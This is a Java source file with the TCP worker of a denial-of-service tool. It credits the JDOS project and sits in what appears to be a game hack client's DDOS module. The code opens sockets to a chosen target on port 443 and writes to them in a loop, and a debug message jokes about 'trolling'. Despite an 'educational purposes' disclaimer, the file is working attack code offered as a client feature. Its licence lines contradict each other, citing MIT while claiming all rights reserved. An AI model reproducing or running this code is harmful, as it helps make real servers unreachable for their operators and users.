/*
 * This program was written by Tobias Schmidradler (schmidi000)
 * and published under the MIT License.
 * 
 * What kind of program is this?
 * This is a program for performing a Distributed Denial of Serivce (DDOS).
 * With a DDOS you could make a host in the network unreachable.
 *
 * 
 * All rights are reserved.
 * 
 * NOTE: 
 * ------------------------------------------------------------------------------------------
 * This program is only for educational purposes!
 * You use this on your own risk. 
 * Distributed Denial of Service attacks are illegal, you could go to jail for this.
 * ------------------------------------------------------------------------------------------
 * 
 * I am liable for nothing!
 *
 * Link: https://github.com/schmidi000/JDOS
 * E-Mail: tobias.schmidradler@gmail.com
 * Website: www.straim.com
 * Copyright (c) 2015
 */
package com.kisman.cc.util.process.web;

import com.kisman.cc.module.misc.DDOSModule;
import i.gishreloaded.gishcode.utils.visual.ChatUtils;

import java.io.IOException;
import java.net.InetSocketAddress;
import java.net.Socket;
import java.net.SocketException;
import java.net.UnknownHostException;

/**
 * This is the TCP implementation of the DDOS.
 * @author Tobias
 * 
 * Last changed: 13.05.2015
 */
public abstract class TCP extends DDOS {
    /**
     * Instance of the current socket.
     */
    private Socket socket;

    public TCP() {
        super();
    }

    /**
     * This is the "main" method.
     * The whole action happens here.
     *  - Open the socket
     *  - Connect the socket
     *  - Write something to the socket
     *  - Close the socket
     */
    @Override
    public void run() {
        createSocket();
        connectToSocket();
        while(!Thread.currentThread().isInterrupted() && (socket.isConnected() && !socket.isClosed())) {
            writeLineToSocket("meow");
            if(DDOSModule.instance.debug.getValBoolean()) ChatUtils.error("We do a little trolling =  )");
            try {
                Thread.sleep(DDOSModule.instance.delay.getValLong());
            } catch (InterruptedException ex) {
                ex.printStackTrace();
            }
        }
        closeSocket();
    }

    /**
     * This method creates the socket.
     */
    protected void createSocket() {
        setAddress(new InetSocketAddress(DDOSModule.instance.getCurrentAddress(), 443));
        socket = new Socket();
        try {
            socket.setKeepAlive(true);
            socket.setSoTimeout((DDOSModule.instance.timeOut.getValInt() * 1000));
        } catch (SocketException ex) {
            ex.printStackTrace();
        }
    }

    /**
     * This method writes something (Protocol dependent) to the socket.
     */
    public abstract void writeLineToSocket(String message);

    protected void connectToSocket() {
        try {
            if(socket != null) socket.connect(getAddress());
        } catch(UnknownHostException ex) {
            ChatUtils.error("Host "+getAddress()+" doesnt exist!");
            ex.printStackTrace();
        } catch(SocketException ex) {
            ChatUtils.error("Error while creating or accessing a Socket!");
            closeSocket();
            ex.printStackTrace();
        } catch (IOException ex) {
            ChatUtils.error("Error while connecting a Socket!");
            ex.printStackTrace();
        }
    }

    /**
     * Close the socket
     */
    protected void closeSocket() {
        try {
            if(socket != null && !socket.isClosed() && socket.isBound()) socket.close();
        } catch (IOException ex) {
            ex.printStackTrace();
        }
    }

    /**
     * Get the socket
     */
    public Socket getSocket() {
        return socket;
    }

    /**
     * Set the socket
     */
    public void setSocket(Socket socket) {
        this.socket = socket;
    }
}